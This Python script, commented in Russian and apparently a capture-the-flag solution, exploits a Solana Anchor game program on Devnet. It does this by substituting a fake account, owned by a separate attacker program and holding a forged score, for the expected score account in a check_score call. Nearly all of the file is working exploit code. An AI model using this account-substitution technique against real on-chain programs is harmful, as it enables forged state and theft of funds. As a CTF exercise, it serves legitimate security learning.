import asyncio
import json
import hashlib
from pathlib import Path

from solana.rpc.async_api import AsyncClient
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.system_program import CreateAccountParams, create_account
from solders.instruction import Instruction, AccountMeta
from solders.message import Message
from solders.transaction import Transaction


async def main():
    print("🚀 Запускаем эксплойт...")

    # Подключаемся к Devnet
    client = AsyncClient("https://api.devnet.solana.com")

    # Читаем твой приватный ключ напрямую из файла Solana CLI
    keypair_path = Path.home() / ".config" / "solana" / "id.json"
    with open(keypair_path, "r") as f:
        secret_key = json.load(f)
    player = Keypair.from_bytes(bytes(secret_key))
    print(f"😎 Твой кошелек: {player.pubkey()}")

    # ID программ
    TARGET_PROGRAM = Pubkey.from_string("Game8gSebBtdsaEgANcGjq7j9XvbJfesAr7NZqRb5WQA")
    HACKER_PROGRAM = Pubkey.from_string("417z2kxmmr8ScRGf1YZAG3ihGa6d2JyA8nZDUgbD8gsa")

    # Вычисляем PDA аккаунты игры
    player_score_pda, _ = Pubkey.find_program_address([b"score", bytes(player.pubkey())], TARGET_PROGRAM)
    completion_pda, _ = Pubkey.find_program_address([b"completed", bytes(player.pubkey())], TARGET_PROGRAM)

    # Функция для вычисления Anchor-дискриминаторов
    def get_discriminator(name: str) -> bytes:
        return hashlib.sha256(f"global:{name}".encode()).digest()[:8]

    # --- ШАГ А: Инициализация ---
    print("⏳ Шаг 1: Инициализируем аккаунты в игре (если их нет)...")
    init_ix = Instruction(
        program_id=TARGET_PROGRAM,
        data=get_discriminator("init_player_score"),
        accounts=[
            AccountMeta(pubkey=player_score_pda, is_signer=False, is_writable=True),
            AccountMeta(pubkey=completion_pda, is_signer=False, is_writable=True),
            AccountMeta(pubkey=player.pubkey(), is_signer=True, is_writable=True),
            AccountMeta(pubkey=Pubkey.from_string("11111111111111111111111111111111"), is_signer=False,
                        is_writable=False),
        ]
    )
    try:
        recent_blockhash = (await client.get_latest_blockhash()).value.blockhash
        msg_init = Message([init_ix], player.pubkey())
        tx_init = Transaction([player], msg_init, recent_blockhash)

        await client.send_transaction(tx_init)
        print("✅ Игрок инициализирован в системе!")
        await asyncio.sleep(2)  # ждем пока блокчейн обновится
    except Exception as e:
        print("ℹ️ Игровой аккаунт уже существует, идем дальше.")

    # --- ШАГ Б: Создание фейкового аккаунта ---
    print("⏳ Шаг 2: Создаем фейковый аккаунт для взлома...")
    fake_account = Keypair()
    space = 49
    rent_resp = await client.get_minimum_balance_for_rent_exemption(space)

    # 1. Инструкция: выделяем место в блокчейне
    create_fake_acc_ix = create_account(
        CreateAccountParams(
            from_pubkey=player.pubkey(),
            to_pubkey=fake_account.pubkey(),
            lamports=rent_resp.value,
            space=space,
            owner=HACKER_PROGRAM
        )
    )

    # 2. Инструкция: говорим нашему контракту записать туда 1 ТРИЛЛИОН очков
    craft_data = get_discriminator("craft_fake_score") + bytes(player.pubkey())
    craft_ix = Instruction(
        program_id=HACKER_PROGRAM,
        data=craft_data,
        accounts=[
            AccountMeta(pubkey=fake_account.pubkey(), is_signer=False, is_writable=True)
        ]
    )

    # --- ШАГ В: Эксплуатация уязвимости ---
    print("⏳ Шаг 3: Наносим удар! Отправляем фейковый счет в игру...")
    check_score_ix = Instruction(
        program_id=TARGET_PROGRAM,
        data=get_discriminator("check_score"),
        accounts=[
            # ВОТ ОН ВЗЛОМ: Вместо настоящего player_score_pda мы суем fake_account!
            AccountMeta(pubkey=fake_account.pubkey(), is_signer=False, is_writable=False),
            AccountMeta(pubkey=completion_pda, is_signer=False, is_writable=True),
            AccountMeta(pubkey=player.pubkey(), is_signer=True, is_writable=False),
        ]
    )

    # Собираем боевую транзакцию по новым правилам
    recent_blockhash = (await client.get_latest_blockhash()).value.blockhash
    msg_hack = Message([create_fake_acc_ix, craft_ix, check_score_ix], player.pubkey())
    tx_hack = Transaction([player, fake_account], msg_hack, recent_blockhash)

    print("🚀 Отправляем эксплойт в сеть...")
    hack_resp = await client.send_transaction(tx_hack)

    print(f"🎉 ГОТОВО! Сигнатура транзакции: {hack_resp.value}")
    print("💻 Теперь иди на сайт CTF, жми 'Get challenge message' -> 'Verify ownership' и забирай флаг!")

    await client.close()


if __name__ == "__main__":
    asyncio.run(main())